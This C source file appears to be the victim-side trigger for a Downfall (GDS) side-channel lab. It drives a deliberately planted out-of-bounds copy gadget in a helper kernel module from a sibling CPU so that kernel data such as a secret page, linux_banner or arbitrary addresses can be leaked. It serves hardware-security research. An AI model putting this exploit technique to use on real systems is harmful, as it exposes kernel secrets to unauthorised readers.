/*
 * ktrigger -- Stage 2 trigger for the kernel memcpy gadget (labs/downfall/
 * kernel).
 *
 * Opens /dev/gds_helper_lkm and loops the OOB_GADGET ioctl while pinned to
 * CPU=3 (the SMT sibling of the attacker on CPU=1). Two call shapes mirror
 * the upstream POC:
 *   MODE=oob: ulong1 = 4096 + OFFSET, ulong2 = -OFFSET - 1   (SAFE variant,
 *             an in-bounds copy whose rep-mov prefetch reads past the page)
 *   MODE=arb: ulong1 = (base - source) + OFFSET, ulong2 = LEN  (BUG/SAFEZ)
 *             with TARGET = secret | banner | source | raw
 *   MODE=krep: ulong1 = OFFSET, ulong2 = LEN -- the module's inline
 *              rep movsb (kernel-mode copy-engine probe)
 *   MODE=kcopy: KOP=movsb|movsq|stosb|scalar|bytewalk via the KCOPY ioctl
 *              (bytewalk = LEN x 1-byte rep movsb at a fixed offset; M3).
 *              An explicitly set TARGET=banner rebases OFFSET onto
 *              linux_banner (kallsyms; needs root) for krep/kcopy too;
 *              ADDR=<hex> rebases OFFSET onto an absolute kernel
 *              address instead (no root needed).
 *   MODE=swz:  S=<0-7> one SWIZZLE ioctl (rotate the secret page right;
 *              relative -- the module tracks the applied rotation)
 *
 * Environment: CPU (default 3), MODE (oob default), OFFSET
 * (default -252 for oob, 0 for arb), LEN (arb only, default 64), TARGET
 * (arb only, default banner; secret|banner|source|raw), ITERS (0 = forever).
 * USER=<byte> runs a user-space loop only (no ioctl) as a control arm;
 * REPMOV=1 switches that loop from YMM loads to rep movsb.
 *
 * The INFO ioctl supplies the source/secret addresses; /proc/kallsyms
 * supplies linux_banner (kptr_restrict=0 on this box). The banner line
 * makes each arm self-describing.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include "gds_helper_lkm.h"

#define PAGE_BYTES 4096UL

static void die(const char *msg)
{
	fprintf(stderr, "ktrigger: %s: %s\n", msg, strerror(errno));
	exit(2);
}

static int env_int(const char *name, int def)
{
	const char *s = getenv(name);
	char *end;
	long v;

	if (s == NULL || s[0] == '\0')
		return def;
	v = strtol(s, &end, 0);
	if (end == s)
		return def;
	return (int)v;
}

static long env_long(const char *name, long def)
{
	const char *s = getenv(name);
	char *end;
	long v;

	if (s == NULL || s[0] == '\0')
		return def;
	v = strtol(s, &end, 0);
	if (end == s)
		return def;
	return v;
}

static unsigned long env_ul(const char *name, unsigned long def)
{
	const char *s = getenv(name);
	char *end;
	unsigned long v;

	if (s == NULL || s[0] == '\0')
		return def;
	v = strtoul(s, &end, 0);
	if (end == s)
		return def;
	return v;
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		die("sched_setaffinity");
}

static unsigned long kallsyms_addr(const char *name)
{
	FILE *f = fopen("/proc/kallsyms", "r");
	char sym[256];
	unsigned long addr;
	char type;

	if (f == NULL)
		die("/proc/kallsyms");
	while (fscanf(f, "%lx %c %255s", &addr, &type, sym) == 3) {
		if (strcmp(sym, name) == 0) {
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}

/* krep/kcopy offset resolution: default is relative to the module's
 * source page; ADDR=<hex> makes OFFSET relative to an absolute kernel
 * address (no root needed); an explicit TARGET=banner resolves
 * linux_banner via kallsyms (root) and rebases onto it. */
static unsigned long rebase_target(int target_set, const char *target,
				   long offset, unsigned long source,
				   unsigned long addr)
{
	unsigned long base;

	if (addr != 0)
		return addr + (unsigned long)offset - source;
	if (!target_set || strcmp(target, "banner") != 0)
		return (unsigned long)offset;
	base = kallsyms_addr("linux_banner");
	if (base == 0) {
		fprintf(stderr, "ktrigger: linux_banner unavailable "
			"(kptr_restrict? run under root)\n");
		exit(2);
	}
	return base + (unsigned long)offset - source;
}

static void __attribute__((noinline)) push_vmov(const uint8_t *src,
						uint8_t *dst)
{
	asm volatile(
		"vmovups    (%0), %%ymm0\n\t"
		"vmovups  32(%0), %%ymm1\n\t"
		"vmovups  64(%0), %%ymm2\n\t"
		"vmovups  96(%0), %%ymm3\n\t"
		"vpaddb  %%ymm1, %%ymm0, %%ymm4\n\t"
		"vpaddb  %%ymm3, %%ymm2, %%ymm5\n\t"
		"vpaddb  %%ymm5, %%ymm4, %%ymm4\n\t"
		"vmovups %%ymm4, (%1)\n\t"
		:: "r"(src), "r"(dst)
		: "ymm0", "ymm1", "ymm2", "ymm3", "ymm4", "ymm5", "memory");
}

static void __attribute__((noinline)) push_repmov(const uint8_t *src,
						  uint8_t *dst)
{
	asm volatile("rep movsb"
		     :: "D"(dst), "S"(src), "c"(4096UL)
		     : "memory");
}

int main(void)
{
	struct gds_helper_lkm_info info;
	struct gds_helper_lkm_params params = { 0, 0 };
	struct gds_helper_lkm_copy cp = { 0, 0, 0, 0 };
	void *req = &params;
	const char *mode = getenv("MODE");
	const char *target = getenv("TARGET");
	long offset;
	unsigned long len, iters, ulong1, ulong2, addr;
	int fd, cpu_id, user_byte, target_set;
	unsigned int cmd = GDS_HELPER_LKM_IOCTL_OOB_GADGET;
	unsigned long i;

	if (mode == NULL || mode[0] == '\0')
		mode = "oob";
	target_set = (target != NULL && target[0] != '\0');
	if (target == NULL || target[0] == '\0')
		target = "banner";

	cpu_id = env_int("CPU", 3);
	iters = env_ul("ITERS", 0);
	addr = env_ul("ADDR", 0);

	user_byte = env_int("USER", -1);
	if (user_byte >= 0 && user_byte <= 255) {
		uint8_t *ubuf, *udst;
		int repmov = env_int("REPMOV", 0);

		ubuf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		udst = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (ubuf == MAP_FAILED || udst == MAP_FAILED)
			die("mmap");
		memset(ubuf, user_byte, 4096);
		pin_cpu(cpu_id);
		printf("ktrigger pid=%d cpu=%d running_on=%d mode=user "
		       "user_byte=0x%02x repmov=%d\n",
		       (int)getpid(), cpu_id, sched_getcpu(), user_byte, repmov);
		fflush(stdout);
		for (;;) {
			if (repmov)
				push_repmov(ubuf, udst);
			else
				push_vmov(ubuf, udst);
		}
	}

	fd = open(GDS_HELPER_LKM_DEVICE_PATH, O_RDONLY);
	if (fd < 0)
		die("open " GDS_HELPER_LKM_DEVICE_PATH
		    " (is the module loaded?)");
	if (ioctl(fd, GDS_HELPER_LKM_IOCTL_INFO, &info) != 0)
		die("INFO ioctl");

	if (strcmp(mode, "oob") == 0) {
		offset = env_long("OFFSET", -252);
		if (offset >= 0 || offset <= -(long)PAGE_BYTES) {
			fprintf(stderr,
				"ktrigger: oob OFFSET must be in (-4096, 0)\n");
			return 2;
		}
		ulong1 = PAGE_BYTES + (unsigned long)offset;
		ulong2 = (unsigned long)(-offset - 1);
	} else if (strcmp(mode, "arb") == 0) {
		unsigned long base = 0;

		offset = env_long("OFFSET", 0);
		len = env_ul("LEN", 64);
		if (strcmp(target, "secret") == 0)
			base = info.secret;
		else if (strcmp(target, "source") == 0)
			base = info.source;
		else if (strcmp(target, "banner") == 0)
			base = kallsyms_addr("linux_banner");
		else if (strcmp(target, "raw") == 0)
			base = 0;
		else {
			fprintf(stderr, "ktrigger: bad TARGET\n");
			return 2;
		}
		if (base == 0 && strcmp(target, "raw") != 0) {
			fprintf(stderr,
				"ktrigger: target address unavailable\n");
			return 2;
		}
		ulong1 = base - info.source + (unsigned long)offset;
		ulong2 = len;
	} else if (strcmp(mode, "krep") == 0) {
		offset = env_long("OFFSET", 0x1000);
		len = env_ul("LEN", 4095);
		ulong1 = rebase_target(target_set, target, offset,
				       info.source, addr);
		ulong2 = len;
		cmd = GDS_HELPER_LKM_IOCTL_KREPMOV;
	} else if (strcmp(mode, "kcopy") == 0) {
		const char *kop = getenv("KOP");

		offset = env_long("OFFSET", 0x1000);
		len = env_ul("LEN", 4095);
		if (kop == NULL || kop[0] == '\0')
			kop = "movsb";
		if (strcmp(kop, "movsb") == 0)
			cp.mode = 0;
		else if (strcmp(kop, "movsq") == 0)
			cp.mode = 1;
		else if (strcmp(kop, "stosb") == 0)
			cp.mode = 2;
		else if (strcmp(kop, "scalar") == 0)
			cp.mode = 3;
		else if (strcmp(kop, "bytewalk") == 0)
			cp.mode = 4;
		else {
			fprintf(stderr, "ktrigger: bad KOP\n");
			return 2;
		}
		cp.offset = rebase_target(target_set, target, offset,
					  info.source, addr);
		cp.len = len;
		cp.byte = env_ul("KAL", 0x47);
		ulong1 = cp.offset;
		ulong2 = cp.len;
		cmd = GDS_HELPER_LKM_IOCTL_KCOPY;
		req = &cp;
	} else if (strcmp(mode, "swz") == 0) {
		ulong1 = env_ul("S", 0) & 7;
		ulong2 = 0;
		offset = (long)ulong1;
		len = 0;
		cmd = GDS_HELPER_LKM_IOCTL_SWIZZLE;
		iters = 1;
	} else {
		fprintf(stderr,
			"ktrigger: MODE must be oob, arb, krep, kcopy, or swz\n");
		return 2;
	}

	params.ulong1 = ulong1;
	params.ulong2 = ulong2;

	pin_cpu(cpu_id);

	printf("ktrigger pid=%d cpu=%d running_on=%d mode=%s target=%s "
	       "offset=%ld len=%lu ulong1=0x%lx ulong2=0x%lx source=0x%lx "
	       "secret=0x%lx\n",
	       (int)getpid(), cpu_id, sched_getcpu(), mode, target, offset,
	       ulong2, ulong1, ulong2, info.source, info.secret);
	fflush(stdout);

	for (i = 0; iters == 0 || i < iters; i++) {
		if (ioctl(fd, cmd, req) != 0)
			die("gadget ioctl");
	}

	printf("ktrigger done iters=%lu\n", i);
	close(fd);
	return 0;
}
